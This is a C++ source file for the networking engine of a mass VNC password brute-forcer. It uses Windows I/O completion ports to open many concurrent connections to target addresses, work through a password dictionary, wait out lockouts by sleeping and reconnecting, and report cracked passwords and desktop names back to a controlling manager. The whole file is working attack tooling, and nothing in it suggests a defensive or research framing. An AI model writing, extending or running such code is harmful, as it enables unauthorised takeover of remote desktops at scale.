#include "includes.h"
#include <mswsock.h>

static void CloseSocket(SOCKET hSock)
{
    LINGER lngr;
    lngr.l_onoff=1;
    lngr.l_linger=0;
    setsockopt(hSock,SOL_SOCKET,SO_LINGER,(PCHAR)&lngr,sizeof(lngr));

    closesocket(hSock);
    return;
}

DWORD dwTotalActiveTasks;

bool IOCP_Connect(PIOCP_CLIENT lpClient,LPDWORD lpdwLastError);

HANDLE hShutdownEvent;
static HANDLE hCompletionPort,hIOCPWorkingThreadsGroup,hCommonThreadsGroup;
static DWORD dwWorkingThreads,
             dwConnectionTimeout=DEFAULT_TIMEOUT,
             dwThreadsPerCore=DEFAULT_THREADS_PER_CORE;

static LPFN_CONNECTEX pConnectEx;

static CRITICAL_SECTION csClients;
static PIOCP_CLIENT lpClients;

volatile DWORD dwActiveTasks=0,bIOCP_StopWork=1,dwUnsupported=0,dwBrutted=0,dwNotRFB=0;

static void Result_OutOfDict(DWORD dwIP,WORD wPort,DWORD dwIdx)
{
    IOCP_QueueResult(dwIP,wPort,dwIdx,NULL,NULL,WKR_RESULT_OUT_OF_DICT);
    return;
}

static void Result_OutOfDict(PIOCP_CLIENT lpClient)
{
    if (lpClient->bResultQueued)
        return;

    if (!lpClient->bInUse)
        return;

    lpClient->bResultQueued=true;

    Result_OutOfDict(lpClient->caddr.sin_addr.s_addr,ntohs(lpClient->caddr.sin_port),lpClient->RfbClient.dwIdx);
    return;
}

static void Result_Failed(PIOCP_CLIENT lpClient)
{
    if (lpClient->bResultQueued)
        return;

    if (!lpClient->bInUse)
        return;

    lpClient->bResultQueued=true;

    WORKER_RESULT dwResult=WKR_RESULT_FAILED;
    switch (lpClient->RfbClient.dwErr)
    {
        case ERR_NOT_RFB:
        {
            InterlockedIncrement(&dwNotRFB);
            dwResult=WKR_RESULT_NOT_RFB;
            break;
        }
        case ERR_AUTH_UNSUPPORTED:
        {
            InterlockedIncrement(&dwUnsupported);
            dwResult=WKR_RESULT_UNSUPPORTED;
            break;
        }
    }

    IOCP_QueueResult(lpClient->caddr.sin_addr.s_addr,ntohs(lpClient->caddr.sin_port),
                     lpClient->RfbClient.dwIdx,NULL,NULL,dwResult);
    return;
}

static void Result_Done(PIOCP_CLIENT lpClient)
{
    if (lpClient->bResultQueued)
        return;

    if (!lpClient->bInUse)
        return;

    lpClient->bResultQueued=true;

    char szPassword[9];
    LPCSTR lpPassword=NULL;
    if (lpClient->RfbClient.dwAuthScheme != rfbNoAuth)
        lpPassword=Dict_GetPassword(lpClient->RfbClient.dwIdx,szPassword);

    IOCP_QueueResult(lpClient->caddr.sin_addr.s_addr,ntohs(lpClient->caddr.sin_port),
                     lpClient->RfbClient.dwIdx,lpPassword,lpClient->RfbClient.szDesktop,WKR_RESULT_DONE);

    InterlockedIncrement(&dwBrutted);
    return;
}

static SOCKET IOCP_Socket()
{
    SOCKET hSock=INVALID_SOCKET;
    do
    {
        hSock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,WSA_FLAG_OVERLAPPED);
        if (hSock == INVALID_SOCKET)
        {
            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"WSASocket() failed, %d",WSAGetLastError());
            break;
        }

        DWORD dwZero=0;
        if (setsockopt(hSock,SOL_SOCKET,SO_SNDBUF,(PCHAR)&dwZero,sizeof(dwZero)) == SOCKET_ERROR)
        {
            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"setsockopt(SO_SNDBUF) failed, %d",WSAGetLastError());

            closesocket(hSock);
            hSock=INVALID_SOCKET;
            break;
        }

        DWORD dwOne=1;
        if (setsockopt(hSock,IPPROTO_TCP,TCP_NODELAY,(PCHAR)&dwOne,sizeof(dwOne)) == SOCKET_ERROR)
        {
            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"setsockopt(TCP_NODELAY) failed, %d",WSAGetLastError());

            closesocket(hSock);
            hSock=INVALID_SOCKET;
            break;
        }

        sockaddr_in addr;
        addr.sin_family=AF_INET;
        addr.sin_addr.s_addr=INADDR_ANY;
        addr.sin_port=0;

        while (true)
        {
            if (bind(hSock,(SOCKADDR*)&addr,sizeof(addr)) != SOCKET_ERROR)
                break;

            if (WSAGetLastError() != WSAENOBUFS)
            {
                DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"bind() failed, %d",WSAGetLastError());

                closesocket(hSock);
                hSock=INVALID_SOCKET;
                break;
            }

            if (WaitForSingleObject(hShutdownEvent,1) == WAIT_OBJECT_0)
                break;
        }
    }
    while (false);
    return hSock;
}

static bool IOCP_FreeSentOverlapped(PIOCP_CLIENT lpClient,PIOCPOL_IO_CTX lpOverlapped)
{
    bool bRet=true;
    EnterCriticalSection(&lpClient->csSendList);
    {
        do
        {
            if (!lpOverlapped)
                break;

            if (InterlockedExchangeAdd(&lpOverlapped->dwOperationsCount,0))
            {
                bRet=false;
                break;
            }

            PIOCPOL_IO_CTX lpNext=lpOverlapped->lpNext,
                           lpPrev=lpOverlapped->lpPrev;

            if (lpNext)
                lpNext->lpPrev=lpPrev;

            if (lpPrev)
                lpPrev->lpNext=lpNext;
            else
                lpClient->lpOvlSend=lpNext;

            MemFree(lpOverlapped->lpSendBuffer);
            MemFree(lpOverlapped);
        }
        while (false);
    }
    LeaveCriticalSection(&lpClient->csSendList);
    return bRet;
}

static bool IOCP_ReNewClient(PIOCP_CLIENT lpClient,bool bReconnect)
{
    bool bRet=false;
    do
    {
        lpClient->hSock=IOCP_Socket();
        if (lpClient->hSock == INVALID_SOCKET)
        {
            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"IOCP_Socket() failed");
            break;
        }

        if (CreateIoCompletionPort((HANDLE)lpClient->hSock,hCompletionPort,(ULONG_PTR)lpClient,0) != hCompletionPort)
        {
            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"CreateIoCompletionPort() failed, %d",GetLastError());

            closesocket(lpClient->hSock);
            lpClient->hSock=INVALID_SOCKET;
            break;
        }

        while (lpClient->lpOvlSend)
        {
            if (!IOCP_FreeSentOverlapped(lpClient,lpClient->lpOvlSend))
                Sleep(1);
        }

        lpClient->ovl.dwConnState=STATE_CONNECTED;
        lpClient->ovl.dwOperationsCount=0;
        lpClient->dwSleepUntil=0;
        lpClient->bResultQueued=false;

        if (bReconnect)
        {
            lpClient->RfbClient.dwState=VNC_HANDSHAKE;
            lpClient->RfbClient.dwErr=OK;

            lpClient->RfbClient.dwIdx++;
            lpClient->RfbClient.bUpdated=true;
        }
        else
            memset(&lpClient->RfbClient,0,sizeof(lpClient->RfbClient));

        bRet=true;
    }
    while (false);
    return bRet;
}

static bool IOCP_NewClient(PIOCP_CLIENT lpClient)
{
    bool bRet=false;
    do
    {
        lpClient->hSock=IOCP_Socket();
        if (lpClient->hSock == INVALID_SOCKET)
        {
            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"IOCP_Socket() failed");
            break;
        }

        if (CreateIoCompletionPort((HANDLE)lpClient->hSock,hCompletionPort,(ULONG_PTR)lpClient,0) != hCompletionPort)
        {
            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"CreateIoCompletionPort() failed, %d",GetLastError());

            closesocket(lpClient->hSock);
            lpClient->hSock=INVALID_SOCKET;
            break;
        }

        lpClient->caddr.sin_family=AF_INET;
        lpClient->ovl.dwConnState=STATE_CONNECTED;

        InitializeCriticalSection(&lpClient->csSendList);
        InitializeCriticalSection(&lpClient->csClient);

        bRet=true;
    }
    while (false);
    return bRet;
}

static bool IOCP_Connect(PIOCP_CLIENT lpClient,LPDWORD lpdwLastError)
{
    lpClient->bClosing=false;

    bool bRet=((pConnectEx(lpClient->hSock,(PSOCKADDR)&lpClient->caddr,sizeof(lpClient->caddr),NULL,0,NULL,&lpClient->ovl.olOverlapped) != false) || (WSAGetLastError() == ERROR_IO_PENDING));

    *lpdwLastError=WSAGetLastError();
    InterlockedExchange(&lpClient->dwLastActivityTime,Now());
    lpClient->dwSleepUntil=0;
    return bRet;
}

static void IOCP_DisconnectInt(PIOCP_CLIENT lpClient)
{
    if (lpClient->hSock != INVALID_SOCKET)
    {
        lpClient->bClosing=true;

        CloseSocket(lpClient->hSock);

        InterlockedExchange(&lpClient->dwLastActivityTime,Now());
        lpClient->hSock=INVALID_SOCKET;
    }
    return;
}

static void IOCP_Disconnect(PIOCP_CLIENT lpClient)
{
    EnterCriticalSection(&lpClient->csClient);
    {
        IOCP_DisconnectInt(lpClient);
    }
    LeaveCriticalSection(&lpClient->csClient);
    return;
}

bool IOCP_AddAddressToBruteList(DWORD dwIP,WORD wPort,DWORD dwIdx)
{
    bool bRet=false;
    do
    {
        if (IOCP_IsStopped())
            break;

        if (dwIdx >= Dict_PasswordsCount())
        {
            Result_OutOfDict(dwIP,wPort,dwIdx);
            bRet=true;
            break;
        }

        EnterCriticalSection(&csClients);
        {
            PIOCP_CLIENT lpClient=lpClients;
            while (lpClient)
            {
                EnterCriticalSection(&lpClient->csClient);
                {
                    if (!lpClient->bInUse)
                    {
                        if (lpClient->hSock == INVALID_SOCKET)
                        {
                            DbgLog_Event(&siManager,LOG_LEVEL_WARNING,"WTF?! hSock == INVALID_SOCKET");

                            IOCP_ReNewClient(lpClient,false);
                        }

                        lpClient->RfbClient.dwIdx=dwIdx;

                        lpClient->caddr.sin_addr.s_addr=dwIP;
                        lpClient->caddr.sin_port=ntohs(wPort);

                        DWORD dwLastError;
                        if (IOCP_Connect(lpClient,&dwLastError))
                        {
                            lpClient->bInUse=true;
                            bRet=true;

                            InterlockedIncrement(&dwActiveTasks);
                        }
                        else
                        {
                            DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"IOCP_Connect(%x) failed, %d",lpClient->hSock,dwLastError);

                            IOCP_DisconnectInt(lpClient);

                            lpClient->caddr.sin_addr.s_addr=0;
                            lpClient->caddr.sin_port=0;

                            IOCP_ReNewClient(lpClient,false);
                        }

                        LeaveCriticalSection(&lpClient->csClient);
                        break;
                    }
                }
                LeaveCriticalSection(&lpClient->csClient);

                lpClient=lpClient->lpNext;
            }
        }
        LeaveCriticalSection(&csClients);
    }
    while (false);

    return bRet;
}

static bool IOCP_SendClientDataInt(PIOCP_CLIENT lpClient,PIOCPOL_IO_CTX lpOverlap)
{
    bool bRet=true;
    while (true)
    {
        DWORD dwBytes=0;
        if (WSASend(lpClient->hSock,&lpOverlap->wsaBuf,1,&dwBytes,0,&lpOverlap->olOverlapped,0) == NO_ERROR)
            break;

        DWORD dwGLE=WSAGetLastError();
        if (dwGLE == WSA_IO_PENDING)
            break;

        if (dwGLE == WSAEWOULDBLOCK)
        {
            Sleep(1);
            continue;
        }

        bRet=false;
        break;
    }
    return bRet;
}

bool IOCP_SendData(PIOCP_CLIENT lpClient,PCHAR lpData,DWORD dwDataSize)
{
    bool bRet=false;
    do
    {
        if (lpClient->bClosing)
            break;

        if (!dwDataSize)
            break;

        PIOCPOL_IO_CTX lpOverlap=(PIOCPOL_IO_CTX)MemAlloc(sizeof(*lpOverlap));
        if (!lpOverlap)
            break;

        lpOverlap->dwConnState=STATE_DATA_SENT;
        lpOverlap->dwBytesToProcess=lpOverlap->wsaBuf.len=dwDataSize;
        lpOverlap->lpSendBuffer=lpOverlap->wsaBuf.buf=(PCHAR)MemCopyEx(lpData,dwDataSize);

        if (!lpOverlap->lpSendBuffer)
        {
            MemFree(lpOverlap);
            break;
        }

        lpOverlap->dwOperationsCount=1;

        bRet=IOCP_SendClientDataInt(lpClient,lpOverlap);
        if (bRet)
        {
            EnterCriticalSection(&lpClient->csSendList);
            {
                if (lpClient->lpOvlSend)
                {
                    lpOverlap->lpNext=lpClient->lpOvlSend;
                    lpClient->lpOvlSend->lpPrev=lpOverlap;
                }

                lpClient->lpOvlSend=lpOverlap;
            }
            LeaveCriticalSection(&lpClient->csSendList);
            break;
        }

        MemFree(lpOverlap->lpSendBuffer);
        MemFree(lpOverlap);
    }
    while (false);
    return bRet;
}

static bool IOCP_RecvClientDataInt(PIOCP_CLIENT lpClient)
{
    bool bRet=true;
    while (true)
    {
        DWORD dwBytes=0,dwFlags=0;
        if (WSARecv(lpClient->hSock,&lpClient->ovl.wsaBuf,1,&dwBytes,&dwFlags,&lpClient->ovl.olOverlapped,NULL) == NO_ERROR)
            break;

        DWORD dwGLE=WSAGetLastError();
        if (dwGLE == WSA_IO_PENDING)
            break;

        if (dwGLE == WSAEWOULDBLOCK)
        {
            Sleep(1);
            continue;
        }

        bRet=false;
        break;
    }
    return bRet;
}

bool IOCP_RecvData(PIOCP_CLIENT lpClient,DWORD dwDataSize)
{
    if (lpClient->bClosing)
        return false;

    bool bRet=false;
    if (!InterlockedExchangeAdd(&lpClient->ovl.dwOperationsCount,0))
    {
        PIOCPOL_IO_CTX lpOverlap=&lpClient->ovl;

        lpOverlap->dwBytesProcessed=0;
        lpOverlap->dwBytesToProcess=dwDataSize;
        lpOverlap->dwConnState=STATE_DATA_RECEIVED;

        lpOverlap->wsaBuf.buf=lpClient->cRecvBuf;
        lpOverlap->wsaBuf.len=sizeof(lpClient->cRecvBuf);

        InterlockedIncrement(&lpClient->ovl.dwOperationsCount);

        bRet=IOCP_RecvClientDataInt(lpClient);
        if (!bRet)
            InterlockedDecrement(&lpClient->ovl.dwOperationsCount);
    }
    return bRet;
}

bool IOCP_RecvMoreData(PIOCP_CLIENT lpClient,DWORD dwDataSize)
{
    if (lpClient->bClosing)
        return false;

    bool bRet=false;
    if (!InterlockedExchangeAdd(&lpClient->ovl.dwOperationsCount,0))
    {
        PIOCPOL_IO_CTX lpOverlap=&lpClient->ovl;

        lpOverlap->dwBytesToProcess=lpOverlap->dwBytesProcessed+dwDataSize;

        lpOverlap->wsaBuf.buf=lpClient->cRecvBuf+lpOverlap->dwBytesProcessed;
        lpOverlap->wsaBuf.len=sizeof(lpClient->cRecvBuf)-lpOverlap->dwBytesProcessed;

        InterlockedIncrement(&lpClient->ovl.dwOperationsCount);

        bRet=IOCP_RecvClientDataInt(lpClient);
        if (!bRet)
            InterlockedDecrement(&lpClient->ovl.dwOperationsCount);
    }
    return bRet;
}

static bool IOCP_LetHimSleep(PIOCP_CLIENT lpClient)
{
    bool bRet=false;
    if (IOCP_ReNewClient(lpClient,true))
    {
        if (lpClient->bTooManyAuthErr)
            lpClient->dwSleepUntil=Now()+RFB_BRUTE_TIME_DELTA_RECONNECT;
        else
            lpClient->dwSleepUntil=Now()+RFB_BRUTE_TIME_DELTA;

        bRet=true;
    }
    return bRet;
}

static bool IOCP_FreeClient(PIOCP_CLIENT lpClient)
{
    bool bRet=false;
    EnterCriticalSection(&lpClient->csClient);
    {
        do
        {
            if (!lpClient->bInUse)
                break;

            if (!lpClient->bClosing)
                break;

            if (InterlockedExchangeAdd(&lpClient->ovl.dwOperationsCount,0))
                break;

            bool bHasUnsent=false;
            while (lpClient->lpOvlSend)
            {
                if (!IOCP_FreeSentOverlapped(lpClient,lpClient->lpOvlSend))
                {
                    bHasUnsent=true;
                    break;
                }
            }

            if (bHasUnsent)
                break;

            InterlockedDecrement(&dwActiveTasks);

            IOCP_DisconnectInt(lpClient);

            lpClient->caddr.sin_addr.s_addr=0;
            lpClient->caddr.sin_port=0;

            IOCP_ReNewClient(lpClient,false);
            lpClient->bInUse=false;

            bRet=true;
        }
        while (false);
    }
    LeaveCriticalSection(&lpClient->csClient);
    return bRet;
}

static void IOCP_FreeClientIfNeeded(PIOCP_CLIENT lpClient)
{
    bool bFree=true;
    do
    {
        if (IOCP_IsStopped())
            break;

        if (lpClient->RfbClient.bGetOutOfHere)
            break;

        if (lpClient->RfbClient.dwErr != ERR_AUTH_FAILED)
            break;

        if (lpClient->RfbClient.dwIdx >= Dict_PasswordsCount())
        {
            Result_OutOfDict(lpClient);
            break;
        }

        if (!IOCP_LetHimSleep(lpClient))
            break;

        bFree=false;
    }
    while (false);

    if (bFree)
    {
        if (!lpClient->bResultQueued)
            Result_Failed(lpClient);

        IOCP_FreeClient(lpClient);
    }
    return;
}

static void IOCP_HandleIO(PIOCP_CLIENT lpClient,PIOCPOL_IO_CTX lpOverlapped,DWORD dwBytesTransfered,DWORD dwError)
{
    if ((dwError != NO_ERROR) || ((!dwBytesTransfered) && (lpOverlapped->dwConnState != STATE_CONNECTED)))
    {
        if (lpOverlapped->dwConnState != STATE_CONNECTED)
            InterlockedDecrement(&lpOverlapped->dwOperationsCount);

        IOCP_AddNextIPToBruteList(lpClient);
        return;
    }

    InterlockedExchange(&lpClient->dwLastActivityTime,Now());

    switch (lpOverlapped->dwConnState)
    {
        case STATE_CONNECTED:
        {
            setsockopt(lpClient->hSock,SOL_SOCKET,SO_UPDATE_CONNECT_CONTEXT,(PCHAR)&lpClient->hSock,sizeof(lpClient->hSock));

            IOCP_RecvData(lpClient,0);
            break;
        }
        case STATE_DATA_RECEIVED:
        {
            if (lpClient->bClosing)
            {
                InterlockedDecrement(&lpClient->ovl.dwOperationsCount);
                break;
            }

            lpOverlapped->dwBytesProcessed+=dwBytesTransfered;

            if (lpOverlapped->dwBytesToProcess > lpOverlapped->dwBytesProcessed)
            {
                lpOverlapped->wsaBuf.buf=lpClient->cRecvBuf+lpOverlapped->dwBytesProcessed;
                lpOverlapped->wsaBuf.len=sizeof(lpClient->cRecvBuf)-lpOverlapped->dwBytesProcessed;

                IOCP_RecvClientDataInt(lpClient);
                break;
            }

            InterlockedDecrement(&lpClient->ovl.dwOperationsCount);

            if (RFB_HandleAnswer(lpClient))
            {
                if (lpClient->RfbClient.dwState == VNC_AUTH_DONE)
                {
                    Result_Done(lpClient);

                    IOCP_AddNextIPToBruteList(lpClient);
                }

                IOCP_RecvData(lpClient,0);
                break;
            }

            if (lpClient->RfbClient.dwErr == ERR_AUTH_FAILED)
            {
                lpClient->bTooManyAuthErr=false;
                IOCP_Disconnect(lpClient);
                break;
            }

            if ((!lpClient->bTooManyAuthErr) && ((lpClient->RfbClient.dwErr == ERR_CONN_FAILED) || (lpClient->RfbClient.dwErr == ERR_TOO_MANY_AUTH)))
            {
                lpClient->bTooManyAuthErr=true;
                IOCP_Disconnect(lpClient);
                break;
            }

            IOCP_AddNextIPToBruteList(lpClient);
            break;
        }
        case STATE_DATA_SENT:
        {
            if (lpClient->bClosing)
            {
                InterlockedDecrement(&lpOverlapped->dwOperationsCount);
                break;
            }

            lpOverlapped->dwBytesProcessed+=dwBytesTransfered;

            if (lpOverlapped->dwBytesProcessed < lpOverlapped->dwBytesToProcess)
            {
                lpOverlapped->wsaBuf.buf+=dwBytesTransfered;
                lpOverlapped->wsaBuf.len-=dwBytesTransfered;

                IOCP_SendClientDataInt(lpClient,lpOverlapped);
                break;
            }

            InterlockedDecrement(&lpOverlapped->dwOperationsCount);

            IOCP_RecvData(lpClient,0);
            break;
        }
    }
    return;
}

static void WINAPI IOCP_WorkerThread(LPVOID)
{
    while (true)
    {
        DWORD dwBytesTransfered=0,dwError=NO_ERROR;
        PIOCP_CLIENT lpClient=NULL;
        PIOCPOL_IO_CTX lpOverlapped=NULL;
        bool bRet=(GetQueuedCompletionStatus(hCompletionPort,&dwBytesTransfered,(PULONG_PTR)&lpClient,(LPOVERLAPPED*)&lpOverlapped,INFINITE) != FALSE);

        if (!lpClient)
            break;

        if (!bRet)
        {
            DWORD dwFlags;
            if (!WSAGetOverlappedResult(lpClient->hSock,&lpOverlapped->olOverlapped,&dwBytesTransfered,FALSE,&dwFlags))
                dwError=WSAGetLastError();
        }

        IOCP_HandleIO(lpClient,lpOverlapped,dwBytesTransfered,dwError);
    }
    return;
}

static void IOCP_Update(PIOCP_CLIENT lpClient,PQUEUE_ITEM *lppQueue)
{
    do
    {
        if (!lpClient)
            break;

        if (lpClient->bResultQueued)
            break;

        if (!lpClient->RfbClient.bUpdated)
            break;

        PQUEUE_ITEM lpQueue=(PQUEUE_ITEM)MemQuickAlloc(sizeof(*lpQueue));
        if (!lpQueue)
            break;

        lpQueue->dwIP=lpClient->caddr.sin_addr.s_addr;
        lpQueue->wPort=ntohs(lpClient->caddr.sin_port);
        lpQueue->dwIdx=lpClient->RfbClient.dwIdx;
        lpQueue->dwResult=WKR_RESULT_IN_USE;

        lpQueue->lpNext=*lppQueue;
        *lppQueue=lpQueue;

        lpClient->RfbClient.bUpdated=false;
    }
    while (false);
    return;
}

static void WINAPI IOCP_UpdateThread(LPVOID)
{
    while (WaitForSingleObject(hShutdownEvent,1*MILLISECONDS_PER_MINUTE) != WAIT_OBJECT_0)
    {
        EnterCriticalSection(&csClients);
        {
            PQUEUE_ITEM lpQueue=NULL;

            PIOCP_CLIENT lpClient=lpClients;
            while (lpClient)
            {
                IOCP_Update(lpClient,&lpQueue);

                lpClient=lpClient->lpNext;
            }

            if (lpQueue)
            {
                IOCP_QueueResultItem(lpQueue);
                lpQueue=NULL;
            }
        }
        LeaveCriticalSection(&csClients);
    }
    return;
}

static void IOCP_Update(PIOCP_CLIENT lpClient)
{
    do
    {
        if (!lpClient)
            break;

        if (lpClient->bResultQueued)
            break;

        if (!lpClient->RfbClient.bUpdated)
            break;

        if (!siManager.bConnected)
        {
            if (WaitForSingleObject(hShutdownEvent,1) == WAIT_OBJECT_0)
                break;
        }

        IOCP_QueueResult(lpClient->caddr.sin_addr.s_addr,ntohs(lpClient->caddr.sin_port),
                         lpClient->RfbClient.dwIdx,NULL,NULL,WKR_RESULT_IN_USE);

        lpClient->RfbClient.bUpdated=false;
    }
    while (false);
    return;
}

static void WINAPI IOCP_MainThread(LPVOID)
{
    while (WaitForSingleObject(hShutdownEvent,1*MILLISECONDS_PER_SECOND) != WAIT_OBJECT_0)
    {
        EnterCriticalSection(&csClients);
        {
            PIOCP_CLIENT lpClient=lpClients;
            while (lpClient)
            {
                do
                {
                    if (!lpClient->bInUse)
                        break;

                    if (lpClient->hSock == INVALID_SOCKET)
                    {
                        IOCP_FreeClientIfNeeded(lpClient);
                        break;
                    }

                    if (IOCP_IsStopped())
                    {
                        IOCP_Disconnect(lpClient);
                        break;
                    }

                    if (lpClient->dwSleepUntil)
                    {
                        if (Now() <= lpClient->dwSleepUntil)
                            break;

                        DWORD dwLastError;
                        if (IOCP_Connect(lpClient,&dwLastError))
                            break;

                        DbgLog_Event(&siManager,LOG_LEVEL_ERROR,"IOCP_Connect(%x) failed, %d",lpClient->hSock,dwLastError);
                        InterlockedExchange(&lpClient->dwLastActivityTime,0);
                    }

                    if ((Now()-InterlockedExchangeAdd(&lpClient->dwLastActivityTime,0)) < dwConnectionTimeout)
                        break;

                    IOCP_AddNextIPToBruteList(lpClient);
                }
                while (false);

                lpClient=lpClient->lpNext;
            }
        }
        LeaveCriticalSection(&csClients);
    }

    if (dwActiveTasks)
    {
        bool bDone;
        do
        {
            bDone=true;

            PIOCP_CLIENT lpClient=lpClients;
            while (lpClient)
            {
                if (lpClient->bInUse)
                {
                    IOCP_DisconnectInt(lpClient);
                    IOCP_FreeClient(lpClient);

                    bDone=false;
                    break;
                }

                IOCP_Update(lpClient);
                lpClient=lpClient->lpNext;
            }
        }
        while (!bDone);
    }

    for (DWORD i=0; i < dwWorkingThreads; i++)
        PostQueuedCompletionStatus(hCompletionPort,0,NULL,NULL);

    ThreadsGroup_WaitForAllExit(hIOCPWorkingThreadsGroup,INFINITE);
    ThreadsGroup_CloseGroup(hIOCPWorkingThreadsGroup);

    dwActiveTasks=0;
    return;
}

static bool IOCP_CreateClient()
{
    bool bRet=false;
    do
    {
        PIOCP_CLIENT lpClient=(PIOCP_CLIENT)MemAlloc(sizeof(*lpClient));
        if (!lpClient)
            break;

        if (!IOCP_NewClient(lpClient))
        {
            MemFree(lpClient);
            break;
        }

        lpClient->caddr.sin_family=AF_INET;

        lpClient->lpPrev=NULL;
        lpClient->lpNext=lpClients;

        if (lpClients)
            lpClients->lpPrev=lpClient;

        lpClients=lpClient;

        bRet=true;
    }
    while (false);
    return bRet;
}

void IOCP_Stop()
{
    SetEvent(hShutdownEvent);
    ThreadsGroup_WaitForAllExit(hCommonThreadsGroup,INFINITE);
    ThreadsGroup_CloseGroup(hCommonThreadsGroup);
    return;
}

bool IOCP_Init(cJSON *jsConfig)
{
    bool bRet=false;

    do
    {
        SOCKET hSock=socket(AF_INET,SOCK_STREAM,0);
        if (hSock == INVALID_SOCKET)
            break;

        GUID guid=WSAID_CONNECTEX;
        DWORD dwBytes;
        if (WSAIoctl(hSock,SIO_GET_EXTENSION_FUNCTION_POINTER,&guid,sizeof(guid),&pConnectEx,sizeof(pConnectEx),&dwBytes,NULL,NULL) != ERROR_SUCCESS)
            break;

        closesocket(hSock);

        hCompletionPort=CreateIoCompletionPort(INVALID_HANDLE_VALUE,NULL,0,0);
        if (!hCompletionPort)
            break;

        dwConnectionTimeout=(DWORD)cJSON_GetIntFromObject(jsConfig,"timeout");
        if (!dwConnectionTimeout)
            dwConnectionTimeout=DEFAULT_TIMEOUT;

        dwThreadsPerCore=(DWORD)cJSON_GetIntFromObject(jsConfig,"threads_per_core");
        if (!dwThreadsPerCore)
            dwThreadsPerCore=DEFAULT_THREADS_PER_CORE;

        SYSTEM_INFO si;
        GetSystemInfo(&si);
        dwWorkingThreads=si.dwNumberOfProcessors*dwThreadsPerCore;

        InitializeCriticalSection(&csClients);
        hIOCPWorkingThreadsGroup=ThreadsGroup_Create();
        hCommonThreadsGroup=ThreadsGroup_Create();
        hShutdownEvent=CreateEvent(NULL,true,false,NULL);

        for (DWORD i=0; i < dwTotalActiveTasks; i++)
        {
            if (IOCP_CreateClient())
                continue;

            dwTotalActiveTasks=i;
            break;
        }

        ThreadsGroup_CreateThread(hIOCPWorkingThreadsGroup,0,(LPTHREAD_START_ROUTINE)IOCP_ResultsQueueThread,NULL,NULL,NULL);

        for (DWORD i=0; i < dwWorkingThreads; i++)
            ThreadsGroup_CreateThreadEx(hIOCPWorkingThreadsGroup,0,(LPTHREAD_START_ROUTINE)IOCP_WorkerThread,NULL,NULL,NULL,0);

        ThreadsGroup_CreateThread(hCommonThreadsGroup,0,(LPTHREAD_START_ROUTINE)IOCP_MainThread,NULL,NULL,NULL);
        ThreadsGroup_CreateThread(hCommonThreadsGroup,0,(LPTHREAD_START_ROUTINE)IOCP_UpdateThread,NULL,NULL,NULL);

        bRet=true;
    }
    while (false);
    return bRet;
}

